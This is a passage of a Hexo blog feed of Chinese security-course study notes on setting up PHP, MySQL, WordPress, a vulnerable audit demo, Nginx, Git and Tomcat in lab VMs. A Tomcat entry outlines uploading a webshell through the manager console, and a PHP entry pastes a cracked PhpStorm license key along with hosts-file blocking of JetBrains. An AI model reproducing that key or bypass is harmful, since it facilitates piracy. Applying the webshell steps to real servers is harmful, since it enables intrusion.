class="headerlink" title="3。重启网卡"></a>3。重启网卡</h2><p>service network restart或者重启    reboot 即可</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress博客和VAuditDemo_Debug留言板安装</title>
      <link href="/2019/08/02/WordPress%E5%8D%9A%E5%AE%A2%E5%92%8CVAuditDemo_Debug%E7%95%99%E8%A8%80%E6%9D%BF%E5%AE%89%E8%A3%85/"/>
      <url>/2019/08/02/WordPress%E5%8D%9A%E5%AE%A2%E5%92%8CVAuditDemo_Debug%E7%95%99%E8%A8%80%E6%9D%BF%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="WoirdPress动态博客的搭建"><a href="#WoirdPress动态博客的搭建" class="headerlink" title="WoirdPress动态博客的搭建"></a>WoirdPress动态博客的搭建</h1><h2 id="动态博客的使用需要服务器。"><a href="#动态博客的使用需要服务器。" class="headerlink" title="动态博客的使用需要服务器。"></a>动态博客的使用需要服务器。</h2><h2 id="1、获取下载"><a href="#1、获取下载" class="headerlink" title="1、获取下载"></a>1、获取下载</h2><p><a href="https://wordpress.org/download" target="_blank" rel="noopener">https://wordpress.org/download</a></p><h2 id="2、使用phpMyAdmin创建数据库"><a href="#2、使用phpMyAdmin创建数据库" class="headerlink" title="2、使用phpMyAdmin创建数据库"></a>2、使用phpMyAdmin创建数据库</h2><p><img src="https://i.loli.net/2019/08/02/5d440eeb6ebbe81950.png" alt><br><img src="https://i.loli.net/2019/08/02/5d440eeb582df86920.png" alt></p><h2 id="3、PC端浏览器登陆-IP-wordpress-wp-admin-setup-config-php"><a href="#3、PC端浏览器登陆-IP-wordpress-wp-admin-setup-config-php" class="headerlink" title="3、PC端浏览器登陆 IP/wordpress/wp-admin/setup-config.php"></a>3、PC端浏览器登陆 IP/wordpress/wp-admin/setup-config.php</h2><p><img src="https://i.loli.net/2019/08/02/5d440eeb4f1f384290.png" alt></p><h2 id="4、出现问题根据页面提示配置文件即可"><a href="#4、出现问题根据页面提示配置文件即可" class="headerlink" title="4、出现问题根据页面提示配置文件即可"></a>4、出现问题根据页面提示配置文件即可</h2><p><img src="https://i.loli.net/2019/08/02/5d440eeb59f1292522.png" alt></p><h2 id="5、创建帐户即可效果图"><a href="#5、创建帐户即可效果图" class="headerlink" title="5、创建帐户即可效果图"></a>5、创建帐户即可效果图</h2><p><img src="https://i.loli.net/2019/08/02/5d440eeb590dc98122.png" alt></p><h1 id="手动安装留言板（VAuditDemo-Debug为例）"><a href="#手动安装留言板（VAuditDemo-Debug为例）" class="headerlink" title="手动安装留言板（VAuditDemo_Debug为例）"></a>手动安装留言板（VAuditDemo_Debug为例）</h1><h2 id="1、登陆phpMyAdmin创建数据库"><a href="#1、登陆phpMyAdmin创建数据库" class="headerlink" title="1、登陆phpMyAdmin创建数据库"></a>1、登陆phpMyAdmin创建数据库</h2><h2 id="2、导入数据库文件"><a href="#2、导入数据库文件" class="headerlink" title="2、导入数据库文件"></a>2、导入数据库文件</h2><p><img src="https://i.loli.net/2019/08/02/5d440eebe5cfe69169.png" alt><br><img src="https://i.loli.net/2019/08/02/5d440eec1557a65841.png" alt><br><img src="https://i.loli.net/2019/08/02/5d440eec327c255357.png" alt></p><h2 id="3、进入sys修改config-php文件"><a href="#3、进入sys修改config-php文件" class="headerlink" title="3、进入sys修改config.php文件"></a>3、进入sys修改config.php文件</h2><p><img src="https://i.loli.net/2019/08/02/5d440eebcfdcb28522.png" alt><br>修改数据库用户、密码、创建数据库名称<br><img src="https://i.loli.net/2019/08/02/5d440eebdb58085616.png" alt></p><h2 id="4、PC登陆、成功效果"><a href="#4、PC登陆、成功效果" class="headerlink" title="4、PC登陆、成功效果"></a>4、PC登陆、成功效果</h2><p><img src="https://i.loli.net/2019/08/02/5d440efc861da93634.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密测试</title>
      <link href="/2019/08/02/%E5%8A%A0%E5%AF%86%E6%B5%8B%E8%AF%95/"/>
      <url>/2019/08/02/%E5%8A%A0%E5%AF%86%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看你猜猜看</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL数据库和 phpMyAdmin安装</title>
      <link href="/2019/08/01/phpMyAdmin%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/"/>
      <url>/2019/08/01/phpMyAdmin%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL数据库的安装"><a href="#MySQL数据库的安装" class="headerlink" title="MySQL数据库的安装"></a>MySQL数据库的安装</h1><p>1、yum install mariadb-server –y<br>安装mariadb-server 数据库服务（原SQL编写员为了开源精神编写的）<br>2．初始化mariadb-server<br>        mysql_secure_installation<br> <img src="https://i.loli.net/2019/08/02/5d4409b0c32bd63909.png" alt><br>        回车，设置root用户密码<br> <img src="https://i.loli.net/2019/08/02/5d4409b09fdcb68520.png" alt><br>        清除其它用户，允许root用户远程连接<br> <img src="https://i.loli.net/2019/08/02/5d4409b0c323c67378.png" alt><br>        移出测试文，重载数据库环境<br> <img src="https://i.loli.net/2019/08/02/5d4409b0bec5887980.png" alt><br>        安装完成<br><strong>注意：防火墙的设置</strong></p><h1 id="安装phpMyAdmin"><a href="#安装phpMyAdmin" class="headerlink" title="安装phpMyAdmin"></a>安装phpMyAdmin</h1><p>1．    创建文件夹使用 wget 命令,在phpMyAdmin官网找下载文2．    将下载的压缩包解压到        /var/www/html 文件夹中(不同的中间件有不同的默认文件夹，可以通过修改 .conf文件修改默认文件夹)，更改权限，重启中间件，设置防火墙<br>3．    PC浏览器浏览IP地址<br>4．    登陆帐户是安装初始化的mariadb帐户和密码</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php环境准备</title>
      <link href="/2019/08/01/php%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
      <url>/2019/08/01/php%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h2><p>yum install 软件，会针对软件源的各种依赖安装相对最新的软件，作为漏洞研究不是最好选择，参照<a href="https://blog.csdn.net/Jackchenyidaiweiren/article/details/80298491" target="_blank" rel="noopener">https://blog.csdn.net/Jackchenyidaiweiren/article/details/80298491</a> 方式安装所需环境</p><h2 id="1、升级CentOS软件仓库"><a href="#1、升级CentOS软件仓库" class="headerlink" title="1、升级CentOS软件仓库"></a>1、升级CentOS软件仓库</h2><pre><code>rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</code></pre><h2 id="2、删除现有所有php软件"><a href="#2、删除现有所有php软件" class="headerlink" title="2、删除现有所有php软件"></a>2、删除现有所有php软件</h2><pre><code>yum remove php php-*</code></pre><h2 id="3、安装php相关环境"><a href="#3、安装php相关环境" class="headerlink" title="3、安装php相关环境"></a>3、安装php相关环境</h2><pre><code>yum install -y php56w php56w-opcache php56w-xml php56w-mcrypt php56w-gd php56w-mysql php56w-intl php56w-mbstring  </code></pre><h2 id="4、php-v-查看当前版本"><a href="#4、php-v-查看当前版本" class="headerlink" title="4、php -v 查看当前版本"></a>4、php -v 查看当前版本</h2><p><img src="https://i.loli.net/2019/08/01/5d42ddd0abf2716270.png" alt></p><h2 id="5、重启服务器"><a href="#5、重启服务器" class="headerlink" title="5、重启服务器"></a>5、重启服务器</h2><pre><code>systemctl restart 服务器名  </code></pre><h1 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h1><h2 id="1、安装PhpStorm-2019-2-exe"><a href="#1、安装PhpStorm-2019-2-exe" class="headerlink" title="1、安装PhpStorm-2019.2.exe"></a>1、安装PhpStorm-2019.2.exe</h2><pre><code>YZVR7WDLV8-eyJsaWNlbnNlSWQiOiJZWlZSN1dETFY4IiwibGljZW5zZWVOYW1lIjoiamV0YnJhaW5zIGpzIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVjYXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJwYWlkVXBUbyI6IjIwMTktMTEtMjYifSx7ImNvZGUiOiJBQyIsInBhaWRVcFRvIjoiMjAxOS0xMS0yNiJ9LHsiY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjAxOS0xMS0yNiJ9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDE5LTExLTI2In0seyJjb2RlIjoiR08iLCJwYWlkVXBUbyI6IjIwMTktMTEtMjYifSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAxOS0xMS0yNiJ9LHsiY29kZSI6IkNMIiwicGFpZFVwVG8iOiIyMDE5LTExLTI2In0seyJjb2RlIjoiUlMwIiwicGFpZFVwVG8iOiIyMDE5LTExLTI2In0seyJjb2RlIjoiUkMiLCJwYWlkVXBUbyI6IjIwMTktMTEtMjYifSx7ImNvZGUiOiJSRCIsInBhaWRVcFRvIjoiMjAxOS0xMS0yNiJ9LHsiY29kZSI6IlBDIiwicGFpZFVwVG8iOiIyMDE5LTExLTI2In0seyJjb2RlIjoiUk0iLCJwYWlkVXBUbyI6IjIwMTktMTEtMjYifSx7ImNvZGUiOiJXUyIsInBhaWRVcFRvIjoiMjAxOS0xMS0yNiJ9LHsiY29kZSI6IkRCIiwicGFpZFVwVG8iOiIyMDE5LTExLTI2In0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwMTktMTEtMjYifSx7ImNvZGUiOiJSU1UiLCJwYWlkVXBUbyI6IjIwMTktMTEtMjYifV0sImhhc2giOiIxMTA1NzI3NC8wIiwiZ3JhY2VQZXJpb2REYXlzIjowLCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-rsJR5mlJcjibqRu1gQAMUCngMe8i+AOWIi+JZkNFYPET2G1ONcLPcIzoATTRi6ofkDm5l+3Y4HXjBPjVU6bHDdMBAzCnUqpXKsCknwSYyPSU0Y5pzuLvw6O9aPlQ46UBoTEC2BL5W6f11S7NlAq7tTbDuvFUynqSGAmTEfuZtKmzRmp20ejTPuMlSO7UqSkZvkg6YvSTrax1d2K+P9SAmVGZ9iC7AzBs4AwTf84QB9qHvE/Nh0oELSHWGG9hsZZ7sVghI/39/jPQFTp8GLFsl36ZPybPhGDam721zxS9H++/eJk23Jz3nxaRluE4dWmpHrDg1qBHp8qVpSFejg2QYw==-MIIElTCCAn2gAwIBAgIBCTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE4MTEwMTEyMjk0NloXDTIwMTEwMjEyMjk0NlowaDELMAkGA1UEBhMCQ1oxDjAMBgNVBAgMBU51c2xlMQ8wDQYDVQQHDAZQcmFndWUxGTAXBgNVBAoMEEpldEJyYWlucyBzLnIuby4xHTAbBgNVBAMMFHByb2QzeS1mcm9tLTIwMTgxMTAxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQAF8uc+YJOHHwOFcPzmbjcxNDuGoOUIP+2h1R75Lecswb7ru2LWWSUMtXVKQzChLNPn/72W0k+oI056tgiwuG7M49LXp4zQVlQnFmWU1wwGvVhq5R63Rpjx1zjGUhcXgayu7+9zMUW596Lbomsg8qVve6euqsrFicYkIIuUu4zYPndJwfe0YkS5nY72SHnNdbPhEnN8wcB2Kz+OIG0lih3yz5EqFhld03bGp222ZQCIghCTVL6QBNadGsiN/lWLl4JdR3lJkZzlpFdiHijoVRdWeSWqM4y0t23c92HXKrgppoSV18XMxrWVdoSM3nuMHwxGhFyde05OdDtLpCv+jlWf5REAHHA201pAU6bJSZINyHDUTB+Beo28rRXSwSh3OUIvYwKNVeoBY+KwOJ7WnuTCUq1meE6GkKc4D/cXmgpOyW/1SmBz3XjVIi/zprZ0zf3qH5mkphtg6ksjKgKjmx1cXfZAAX6wcDBNaCL+Ortep1Dh8xDUbqbBVNBL4jbiL3i3xsfNiyJgaZ5sX7i8tmStEpLbPwvHcByuf59qJhV/bZOl8KqJBETCDJcY6O2aqhTUy+9x93ThKs1GKrRPePrWPluud7ttlgtRveit/pcBrnQcXOl1rHq7ByB8CFAxNotRUYL9IF5n3wJOgkPojMy6jetQA5Ogc8Sm7RG6vg1yow==</code></pre><p>修改host<br>0.0.0.0 account.jetbrains.com<br>0.0.0.0 <a href="http://www.jetbrains.com" target="_blank" rel="noopener">www.jetbrains.com</a>  （可以不加）</p><h2 id="2、安装-phpStudy-64-（php集成环境）"><a href="#2、安装-phpStudy-64-（php集成环境）" class="headerlink" title="2、安装 phpStudy_64 （php集成环境）"></a>2、安装 phpStudy_64 （php集成环境）</h2><p>在phpStudy中修改<br><img src="https://i.loli.net/2019/08/01/5d42ddd10413a34685.png" alt><br><img src="https://i.loli.net/2019/08/01/5d42ddd0d9bb415322.png" alt><br>将  \phpstudy_pro\Extensions\php\php5.6.9nts 添加到环境变量中<br>在PhpStorm的设置中添加<br><img src="https://i.loli.net/2019/08/01/5d42ddd11586f55665.png" alt><br>即可</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第三周 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx网站的搭建</title>
      <link href="/2019/08/01/Nginx%E7%BD%91%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/08/01/Nginx%E7%BD%91%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>准备环境：CentOS-7-Mini<br>1、下载源码，使用ssh连接安装<br>2、使用wget指令下载<br><img src="https://i.loli.net/2019/08/01/5d42d6739969e66310.png" alt><br><img src="https://i.loli.net/2019/08/01/5d42d7b36a57e90993.png" alt><br>3、解压到Httpd根目录下根据安装信息安装（README之类）<br>4、执行 ./configure 自动检查环境<br>5、执行 make 根据configure生成的<br>6、执行 make install 将编译生成的文件上传到Linux系统用户的执行程序的默认目录中，类似win注册环境变量<br>7、修改文件权限为中间件用户 chown -R 用户名：用户名 修改文件夹<br>8、添加防火墙白名单<br>9、外网登陆即可</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下应用的安装</title>
      <link href="/2019/08/01/Linux%E4%B8%8B%E5%BA%94%E7%94%A8%E7%9A%84%E5%AE%89%E8%A3%85/"/>
      <url>/2019/08/01/Linux%E4%B8%8B%E5%BA%94%E7%94%A8%E7%9A%84%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="1、通过yum指令安装（类似安装包）"><a href="#1、通过yum指令安装（类似安装包）" class="headerlink" title="1、通过yum指令安装（类似安装包）"></a>1、通过yum指令安装（类似安装包）</h1><h2 id="a-安装原理："><a href="#a-安装原理：" class="headerlink" title="a)    安装原理："></a>a)    安装原理：</h2><p>通过分析rpm的包头数据，根据软件的相关性制作出属性相对应的解决方案，自动处理软件的相依属性，解决安装或移出或升级的问题</p><h2 id="b-最简单的安装方式："><a href="#b-最简单的安装方式：" class="headerlink" title="b)    最简单的安装方式："></a>b)    最简单的安装方式：</h2><p>yum search 软件    搜索安装软件包<br><img src="https://s2.ax1x.com/2019/08/02/edwthD.png" alt="edwthD.png"></p><h2 id="c-yum-install-软件，如果没有搜到就需要换指令"><a href="#c-yum-install-软件，如果没有搜到就需要换指令" class="headerlink" title="c)    yum install 软件，如果没有搜到就需要换指令"></a>c)    yum install 软件，如果没有搜到就需要换指令</h2><p><img src="https://s2.ax1x.com/2019/08/02/edwU9e.png" alt="edwU9e.png"></p><h2 id="d-yum-remove-软件"><a href="#d-yum-remove-软件" class="headerlink" title="d)    yum remove 软件"></a>d)    yum remove 软件</h2><p>卸载软件，但不会卸载相关的相依属性软件</p><h1 id="2、通过rpm指令安装（类似压缩包）"><a href="#2、通过rpm指令安装（类似压缩包）" class="headerlink" title="2、通过rpm指令安装（类似压缩包）"></a>2、通过rpm指令安装（类似压缩包）</h1><h2 id="a-安装原理：-1"><a href="#a-安装原理：-1" class="headerlink" title="a)    安装原理："></a>a)    安装原理：</h2><p>rpm安装时会先读取文件内记载的设置参数，与Linux系统环境比对，自动化安装。类似windows下的 .exe安装包</p><h2 id="b-rpm查询已安装的软件件信息"><a href="#b-rpm查询已安装的软件件信息" class="headerlink" title="b)    rpm查询已安装的软件件信息"></a>b)    rpm查询已安装的软件件信息</h2><pre><code>    i.    –q：仅查询后面接的软件名称是否安装    ii.    –qa：列出所有已在本机安装的软件名    iii.    –ql：列出该软件所有的文件与目录所在的完整文件名（list）    iv.    –qR：列出该软件有关的相依软件所含的文件（类似：Required）</code></pre><h2 id="c-rpm安装软件："><a href="#c-rpm安装软件：" class="headerlink" title="c)    rpm安装软件："></a>c)    rpm安装软件：</h2><pre><code>    i.    -i：指定 .rpm文件    ii.    –v：查看更详细的安装信息    iii.    –h：以安装信息列显示安装进度    iv.    –U：指定 .rpm文件升级同名包</code></pre><h1 id="3、通过源码安装"><a href="#3、通过源码安装" class="headerlink" title="3、通过源码安装"></a>3、通过源码安装</h1><h2 id="a-安装原理：-2"><a href="#a-安装原理：-2" class="headerlink" title="a)    安装原理："></a>a)    安装原理：</h2><p>通过源码打包的方式安装，需要进行编译后安装</p><h2 id="b-步骤："><a href="#b-步骤：" class="headerlink" title="b)    步骤："></a>b)    步骤：</h2><pre><code>i.    下载源码，创建文件夹解压项目ii.    进入目录查看帮助文档，编译安装iii.    常用指令：    1.    ./configure：本质上是脚本文件，运行configure文件    2.    ./make：如果configure检查系统相关环境，如果通过会生成Makefile文件，使用make按照Makefile的指令编译文件生成可执行程序    3.    make install：通过文件年拷贝完成对源码的安装，本质上类似，windows的环境变量注册，创建快捷方式    4.    make clean：清除Makefile产生的临时文件    比较常用    5.    make uninstall：根据Makefile文件删除，效果不大    6.    gcc make：是GNU编译套件按照Makefile编译程序</code></pre><p><strong>备注：</strong>开发者工具包<br>    yum groupinstall “Development Tools” –y        （-y安装默认yes）</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用github搭建博客，项目管理</title>
      <link href="/2019/07/31/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%8C%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
      <url>/2019/07/31/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%8C%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1、使用ssh生成公钥和私钥"><a href="#1、使用ssh生成公钥和私钥" class="headerlink" title="1、使用ssh生成公钥和私钥"></a>1、使用ssh生成公钥和私钥</h1><p>win7需要安装ssh工具，win10自带有<br>在 cmd/powershell 窗口执行 ssh-keygen -t rsa 会在用户根目录下生成公钥文件（.pub）和私钥文件（.rsa）<br>公钥文件作为文件之间传输的口令，私钥文件则是认证令牌，丢失则只能重新生成</p><h1 id="2、使用github项目管理"><a href="#2、使用github项目管理" class="headerlink" title="2、使用github项目管理"></a>2、使用github项目管理</h1><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>1。yum install git 安装git<br>2。创建用户git，切换git用户<br>3。进入git用户的根目录，修改 .ssh 700 文件夹权限（限制ssh服务）创建authorized_keys 600 文件权限，如果权限不正确可能会认证失败。<br>4。在git用户的家目录下创建project目录，用来存放git项目<br>5。执行 git init –bare 文件名.git 初始化一个git项目</p><h2 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h2><p>安装git客户端<br><img src="https://i.loli.net/2019/08/01/5d427e291c47d57645.png" alt><br><img src="https://i.loli.net/2019/08/01/5d427e42c1da613299.png" alt><br>一路回车，安装成功后，运行Git Bash，执行ssh-keygen一路回车，将生成的 公钥写入虚拟机 创建的authorized_keys。<br><strong>注意：</strong>vim 复制粘贴时先 i 后粘贴否则可能会有遗漏<br>在Git Bash上执行一些命令<br>git clone git@ip:/home/git/Project/创建的文件名一致.git     相当于复制文件<br>git pull   下载<br>git push   上传<br>Git Bash有个漏洞，执行 ssh git@IP 即可连接服务器<br>关闭方法：<br>服务端执行 usermod -s /sbin/nologin git</p><h1 id="3、github博客（使用hexo博客上传git仓库）"><a href="#3、github博客（使用hexo博客上传git仓库）" class="headerlink" title="3、github博客（使用hexo博客上传git仓库）"></a>3、github博客（使用hexo博客上传git仓库）</h1><p>准备：<br>    1。安装node.js和git客户端<br>    2。在创建的博客文件夹执行cmd命令</p><pre><code>npm install –g hexo-cli –registry=https//registry.npm.taobao.org   执行的是掏宝的源3。执行hexo init **注意:** 必须保证下载完成，否则需要清除文件夹重新下载4。执行hexo g5。执行hexo s  浏览器访问相关hexo配置文档 https://hexo.io/zh-cn/docs/     hexo配置文档</code></pre><h1 id="4、博客主题更换"><a href="#4、博客主题更换" class="headerlink" title="4、博客主题更换"></a>4、博客主题更换</h1><h2 id="1、查找主题："><a href="#1、查找主题：" class="headerlink" title="1、查找主题："></a>1、查找主题：</h2><pre><code>https：//hexo.io/ 网站查找心仪主题</code></pre><h2 id="2、下载"><a href="#2、下载" class="headerlink" title="2、下载"></a>2、下载</h2><pre><code>1。下载zip压缩包解压到博客文件夹下的 themes 文件夹中</code></pre><p><img src="https://i.loli.net/2019/08/01/5d427fedc6cf854840.png" alt><br>    2。或者使用命令 git clone url完成下载<br><img src="https://i.loli.net/2019/08/01/5d428010ef24064222.png" alt></p><h2 id="3、根据相关主题文档进行安装"><a href="#3、根据相关主题文档进行安装" class="headerlink" title="3、根据相关主题文档进行安装"></a>3、根据相关主题文档进行安装</h2><h2 id="4、依次执行"><a href="#4、依次执行" class="headerlink" title="4、依次执行"></a>4、依次执行</h2><pre><code>hexo cleanhexo ghexo s  即可本地浏览hexo d  上传（需要进行相关设置）</code></pre><h1 id="5、本地博客上传"><a href="#5、本地博客上传" class="headerlink" title="5、本地博客上传"></a>5、本地博客上传</h1><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><pre><code>1。注册github登录并创建仓库</code></pre><p><img src="https://i.loli.net/2019/08/01/5d427e60012db14123.png" alt><br><img src="https://i.loli.net/2019/08/01/5d427e79828e338692.png" alt><br>    <strong>备注：</strong>域名解析只识别小写字母，中文等特殊符号不识别。博客更新源理：通过对github提供的在线仓库上传修改相关配置达到创建个性博客的目的<br>    2。设置使用ssh创建的公钥建立网络认证<br><img src="https://i.loli.net/2019/08/01/5d427e968b88124621.png" alt></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><pre><code>上传两种方式：</code></pre><h3 id="A、第一种方式"><a href="#A、第一种方式" class="headerlink" title="A、第一种方式"></a>A、第一种方式</h3><pre><code>1。使用github桌面版，登陆帐户。设置默认文件夹。2。在创建的博客文件夹内执行cmd命令 hexo g3。将生成的public文件夹拷贝到 github设置的默认文件夹下。4。使用github桌面版执行上传</code></pre><h3 id="B、第二种方式"><a href="#B、第二种方式" class="headerlink" title="B、第二种方式"></a>B、第二种方式</h3><pre><code>修改创建博客的文件夹下的 _config.yml文件</code></pre><p><img src="https://i.loli.net/2019/08/01/5d423789ca45565478.png" alt><br>    执行hexo g<br>    hexo d即可  <strong>注意：</strong>上传和生成新blog时最好先执行hexo clean清除缓存</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat服务器的搭建</title>
      <link href="/2019/07/31/Tomcat%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/07/31/Tomcat%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1、kail修改源"><a href="#1、kail修改源" class="headerlink" title="1、kail修改源"></a>1、kail修改源</h1><p>vi或vim /etc/apt/soures.list<br><img src="https://i.loli.net/2019/07/31/5d4185019ce5e82169.png" alt><br>相关源可以百度等：清华源、阿里云源、中科大源</p><h1 id="2、Tomcat服务器配置"><a href="#2、Tomcat服务器配置" class="headerlink" title="2、Tomcat服务器配置"></a>2、Tomcat服务器配置</h1><p>准备环境：CentOS-7-mini<br>步骤：</p><pre><code>1．    下载Tomcat服务器的Linux压缩包2．    解压，根据需要修改 conf/server.xml文件修改端口是在：conf/server.xml文件&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8843&quot;/&gt;中的8080端口修改3．    执行 bin/startup.sh脚本    ./startup.sh4．    启动防火墙、添加白名单        注意：防火墙端口和 conf/service.xml修改的端口一致防火墙启动systemctl start firewalld添加白名单firewall-cmd --zone=public --add-port=8080/tcp --permanent重启防火墙firewall-cmd --reload5．    PC浏览器输入虚拟机IP或虚拟机浏览器输入IP（本地：127.0.0.1）查看问题：检测PC与虚拟机的ping是否通；查看防火墙端口是否添加</code></pre><h1 id="3、Tomcat添加管理员用户和密码"><a href="#3、Tomcat添加管理员用户和密码" class="headerlink" title="3、Tomcat添加管理员用户和密码"></a>3、Tomcat添加管理员用户和密码</h1><p>vim /home/cent/Desktop/wss/apache-tomcat-8.5.43/conf/tomcat-users.xml     html语言根据该文件复述添加修改用户即可<br><img src="https://i.loli.net/2019/07/31/5d41852a50ff335920.png" alt><br>再次登陆输入密码即可进入后台管理    </p><h1 id="4、Tomcat文件上传漏洞"><a href="#4、Tomcat文件上传漏洞" class="headerlink" title="4、Tomcat文件上传漏洞"></a>4、Tomcat文件上传漏洞</h1><p>如果PC端连接Tomcat服务器出现403：<br>修改 ./apache-tomcat-8.5.43/webapps/manager/META-INF/context.xml 允许外网上传文件<br><img src="https://i.loli.net/2019/07/31/5d418a498ef8b50175.png" alt><br>allow=”\d+.\d+.\d+.\d+”    正则表达式，筛选出IP地址</p><h2 id="PC端上传webshell的流程"><a href="#PC端上传webshell的流程" class="headerlink" title="PC端上传webshell的流程"></a>PC端上传webshell的流程</h2><p>1。进入Tomcat后台管理系统<br>2。<img src="https://i.loli.net/2019/07/31/5d418a494181f32204.png" alt><br>选择编写好的WebShell上传<br>3。查看WebShell源码确定登陆密码，刷新页面，进入上传得文件内<img src="https://i.loli.net/2019/07/31/5d418a495ed6557015.png" alt><br>此漏洞的关闭方法：<br>虚拟机执行 usermod -s /sbin/nologin git 目的是修改passwd文件中用户的 /bin/bash 可执行目录，nologin是不运行用户登录。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第二周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux根目录下的文件夹</title>
